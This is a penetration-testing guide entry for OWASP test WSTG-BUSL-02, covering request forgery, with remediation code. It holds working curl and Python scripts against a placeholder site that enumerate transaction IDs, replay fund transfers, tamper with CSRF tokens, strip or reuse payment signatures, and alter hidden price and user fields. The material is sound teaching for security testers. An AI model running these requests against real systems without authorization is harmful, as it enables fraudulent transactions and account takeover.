# WSTG-BUSL-02: Test Ability to Forge Requests

## Test ID
WSTG-BUSL-02

## Test Name
Test Ability to Forge Requests

## High-Level Description

Request forgery testing examines whether an application properly validates the authenticity and integrity of requests. Attackers may attempt to forge requests by predicting parameters, manipulating tokens, replaying captured requests, or bypassing client-side controls. This test identifies weaknesses that allow attackers to submit unauthorized or manipulated requests that the application incorrectly accepts as legitimate.

---

## What to Check

### Request Forgery Vectors

- [ ] Predictable tokens/identifiers
- [ ] Missing request validation
- [ ] Replay attack vulnerability
- [ ] Parameter manipulation
- [ ] Missing integrity checks
- [ ] Client-side validation bypass

### Vulnerable Components

| Component | Attack Vector |
|-----------|---------------|
| Session tokens | Prediction/brute-force |
| Transaction IDs | Sequential enumeration |
| CSRF tokens | Weak generation |
| Order references | Manipulation |
| Timestamps | Replay attacks |

---

## How to Test

### Step 1: Analyze Request Structure

```bash
# Capture and analyze a typical transaction
curl -s -X POST "https://target.com/api/transaction" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "transaction_id": "TXN-2024-00001",
        "amount": 100,
        "recipient": "user123",
        "timestamp": "2024-01-01T10:00:00Z",
        "signature": "abc123..."
    }' -v

# Note:
# - Transaction ID format
# - Timestamp format
# - Signature/hash presence
# - Token format
```

### Step 2: Test Predictable Identifiers

```bash
#!/bin/bash
# Test sequential ID prediction

# If we have TXN-2024-00100, try nearby IDs
base_id=100

for offset in -5 -4 -3 -2 -1 1 2 3 4 5; do
    test_id=$((base_id + offset))
    padded_id=$(printf "%05d" $test_id)

    response=$(curl -s "https://target.com/api/transactions/TXN-2024-$padded_id" \
        -H "Authorization: Bearer $TOKEN" \
        -w "\n%{http_code}")

    status=$(echo "$response" | tail -1)
    echo "TXN-2024-$padded_id: $status"
done
```

### Step 3: Test Request Replay

```bash
# Capture a valid request
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from": "account1",
        "to": "account2",
        "amount": 100,
        "nonce": "abc123"
    }' > original_response.txt

# Wait and replay the same request
sleep 5

curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from": "account1",
        "to": "account2",
        "amount": 100,
        "nonce": "abc123"
    }' > replay_response.txt

# Compare responses - if both succeed, replay attack works
diff original_response.txt replay_response.txt
```

### Step 4: Test Token Manipulation

```bash
# Test CSRF token manipulation
# Get valid token
csrf_token=$(curl -s "https://target.com/form" | \
    grep -oP 'name="csrf_token" value="\K[^"]+')

# Try with modified token
curl -s -X POST "https://target.com/api/action" \
    -H "X-CSRF-Token: ${csrf_token}modified" \
    -d "action=test"

# Try with empty token
curl -s -X POST "https://target.com/api/action" \
    -H "X-CSRF-Token: " \
    -d "action=test"

# Try without token
curl -s -X POST "https://target.com/api/action" \
    -d "action=test"

# Try with old/expired token
curl -s -X POST "https://target.com/api/action" \
    -H "X-CSRF-Token: old_captured_token" \
    -d "action=test"
```

### Step 5: Test Signature Bypass

```bash
# If request has signature/hash
# Try without signature
curl -s -X POST "https://target.com/api/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "amount": 100,
        "to": "attacker"
    }'  # No signature field

# Try with empty signature
curl -s -X POST "https://target.com/api/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "amount": 100,
        "to": "attacker",
        "signature": ""
    }'

# Try modifying data while keeping old signature
curl -s -X POST "https://target.com/api/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "amount": 10000,
        "to": "attacker",
        "signature": "valid_signature_for_different_amount"
    }'
```

### Step 6: Test Timestamp Manipulation

```bash
# Capture valid request with timestamp
valid_timestamp="2024-01-01T10:00:00Z"

# Test with future timestamp
curl -s -X POST "https://target.com/api/request" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
        \"action\": \"test\",
        \"timestamp\": \"2099-01-01T10:00:00Z\"
    }"

# Test with very old timestamp
curl -s -X POST "https://target.com/api/request" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
        \"action\": \"test\",
        \"timestamp\": \"2000-01-01T10:00:00Z\"
    }"

# Test without timestamp
curl -s -X POST "https://target.com/api/request" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
        \"action\": \"test\"
    }"
```

### Step 7: Test Parameter Tampering

```bash
# Hidden form field manipulation
# Original: <input type="hidden" name="user_id" value="123">
curl -s -X POST "https://target.com/profile/update" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "user_id=456&name=Attacker"  # Changed user_id

# Price manipulation in hidden fields
curl -s -X POST "https://target.com/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "product_id=1&price=0.01&quantity=1"

# Referrer code manipulation
curl -s -X POST "https://target.com/register" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&referrer_id=admin"
```

---

## Tools

### Manual Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Request interception | Modify and replay |
| **Burp Repeater** | Request replay | Test manipulations |
| **Postman** | API testing | Collection-based tests |

### Analysis

| Tool | Description |
|------|-------------|
| **Burp Sequencer** | Token randomness analysis |
| **hashcat** | Hash cracking |
| **CyberChef** | Encoding/decoding |

---

## Example Commands/Payloads

### Token Prediction Script

```python
#!/usr/bin/env python3
import requests
import time
from collections import Counter

class TokenAnalyzer:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {"Authorization": f"Bearer {token}"}

    def collect_tokens(self, endpoint, count=100):
        """Collect tokens for analysis"""
        tokens = []

        for _ in range(count):
            response = requests.get(
                f"{self.base_url}{endpoint}",
                headers=self.headers
            )

            # Extract token from response
            token = response.json().get('csrf_token')
            if token:
                tokens.append(token)

            time.sleep(0.1)

        return tokens

    def analyze_patterns(self, tokens):
        """Analyze token patterns"""
        results = {
            "total": len(tokens),
            "unique": len(set(tokens)),
            "lengths": Counter(len(t) for t in tokens),
            "prefixes": Counter(t[:4] for t in tokens),
        }

        # Check for sequential patterns
        if len(tokens) >= 2:
            try:
                nums = [int(t, 16) for t in tokens]
                diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
                results["sequential"] = len(set(diffs)) == 1
            except:
                results["sequential"] = False

        return results

    def test_prediction(self, endpoint, known_token):
        """Test if next token is predictable"""
        # If sequential, try to predict next
        try:
            current = int(known_token, 16)
            predicted = hex(current + 1)[2:]

            response = requests.post(
                f"{self.base_url}{endpoint}",
                headers={**self.headers, "X-CSRF-Token": predicted}
            )

            return response.status_code == 200
        except:
            return False

# Usage
analyzer = TokenAnalyzer("https://target.com", "auth_token")
tokens = analyzer.collect_tokens("/api/get-csrf")
analysis = analyzer.analyze_patterns(tokens)
print(analysis)
```

### Replay Attack Tester

```python
#!/usr/bin/env python3
import requests
import time
import json

def test_replay_attack(url, headers, data, delay_seconds=5):
    """Test if request can be replayed"""

    # First request
    response1 = requests.post(url, headers=headers, json=data)
    result1 = {
        "status": response1.status_code,
        "success": response1.status_code == 200,
        "response": response1.text[:500]
    }

    print(f"First request: {result1['status']}")

    # Wait
    time.sleep(delay_seconds)

    # Replay same request
    response2 = requests.post(url, headers=headers, json=data)
    result2 = {
        "status": response2.status_code,
        "success": response2.status_code == 200,
        "response": response2.text[:500]
    }

    print(f"Replay request: {result2['status']}")

    # Check if replay succeeded
    if result1["success"] and result2["success"]:
        print("[VULNERABLE] Replay attack successful!")
        return True
    else:
        print("[PROTECTED] Replay attack prevented")
        return False

# Test
test_replay_attack(
    "https://target.com/api/transfer",
    {"Authorization": "Bearer token", "Content-Type": "application/json"},
    {"from": "acc1", "to": "acc2", "amount": 100, "nonce": "test123"}
)
```

---

## Remediation Guide

### 1. Implement Request Nonces

```python
import secrets
from datetime import datetime, timedelta

class NonceManager:
    def __init__(self):
        self.used_nonces = {}  # Use Redis in production

    def generate_nonce(self, user_id):
        """Generate unique nonce for user"""
        nonce = secrets.token_urlsafe(32)
        self.used_nonces[nonce] = {
            "user_id": user_id,
            "created": datetime.utcnow(),
            "used": False
        }
        return nonce

    def validate_nonce(self, nonce, user_id):
        """Validate and consume nonce"""
        if nonce not in self.used_nonces:
            return False

        nonce_data = self.used_nonces[nonce]

        # Check ownership
        if nonce_data["user_id"] != user_id:
            return False

        # Check if already used
        if nonce_data["used"]:
            return False

        # Check expiration (e.g., 5 minutes)
        if datetime.utcnow() - nonce_data["created"] > timedelta(minutes=5):
            return False

        # Mark as used
        nonce_data["used"] = True

        return True
```

### 2. Request Signing

```python
import hmac
import hashlib
import json

def sign_request(data, secret_key):
    """Sign request data"""
    # Canonical string representation
    canonical = json.dumps(data, sort_keys=True)
    signature = hmac.new(
        secret_key.encode(),
        canonical.encode(),
        hashlib.sha256
    ).hexdigest()
    return signature

def verify_signature(data, signature, secret_key):
    """Verify request signature"""
    expected = sign_request(data, secret_key)
    return hmac.compare_digest(signature, expected)

@app.route('/api/transaction', methods=['POST'])
def process_transaction():
    data = request.json
    signature = request.headers.get('X-Signature')

    # Remove signature from data for verification
    data_to_verify = {k: v for k, v in data.items() if k != 'signature'}

    if not verify_signature(data_to_verify, signature, SECRET_KEY):
        return jsonify({"error": "Invalid signature"}), 403

    # Process transaction
    return process(data)
```

### 3. Timestamp Validation

```python
from datetime import datetime, timedelta

def validate_timestamp(timestamp_str, max_age_seconds=300):
    """Validate request timestamp"""
    try:
        timestamp = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
        now = datetime.now(timestamp.tzinfo)

        age = abs((now - timestamp).total_seconds())

        if age > max_age_seconds:
            return False, "Request expired"

        return True, None

    except Exception as e:
        return False, "Invalid timestamp format"

@app.route('/api/request', methods=['POST'])
def handle_request():
    timestamp = request.json.get('timestamp')

    valid, error = validate_timestamp(timestamp)
    if not valid:
        return jsonify({"error": error}), 400

    # Process request
```

### 4. Anti-Replay with Redis

```python
import redis
import secrets

redis_client = redis.Redis()

def generate_idempotency_key():
    """Generate unique idempotency key"""
    return secrets.token_urlsafe(32)

def check_and_mark_processed(idempotency_key, ttl=3600):
    """Check if request was already processed"""
    key = f"idempotency:{idempotency_key}"

    # Try to set key (only succeeds if not exists)
    if redis_client.setnx(key, "1"):
        redis_client.expire(key, ttl)
        return False  # Not processed before

    return True  # Already processed

@app.route('/api/payment', methods=['POST'])
def process_payment():
    idempotency_key = request.headers.get('Idempotency-Key')

    if not idempotency_key:
        return jsonify({"error": "Idempotency key required"}), 400

    if check_and_mark_processed(idempotency_key):
        # Return cached response or reject
        return jsonify({"error": "Request already processed"}), 409

    # Process payment
    result = process_payment_logic(request.json)
    return jsonify(result)
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Replay attack on financial transactions | 9.8 | Critical |
| Predictable transaction IDs | 8.8 | High |
| Missing signature validation | 8.8 | High |
| Weak nonce/token generation | 7.5 | High |
| Timestamp validation bypass | 6.5 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-352** | Cross-Site Request Forgery | Missing CSRF protection |
| **CWE-294** | Authentication Bypass by Capture-replay | Replay attacks |
| **CWE-330** | Use of Insufficiently Random Values | Predictable tokens |
| **CWE-345** | Insufficient Verification of Data Authenticity | Missing integrity |

---

## References

- [OWASP WSTG - Test Ability to Forge Requests](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Testing for CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)

---

## Checklist

```
[ ] Request structure analyzed
[ ] Token randomness verified (Burp Sequencer)
[ ] Sequential ID prediction tested
[ ] Replay attacks tested
[ ] Timestamp validation tested
[ ] Signature/integrity checks tested
[ ] Hidden field manipulation tested
[ ] CSRF token validation tested
[ ] Nonce implementation verified
[ ] Client-side bypass tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
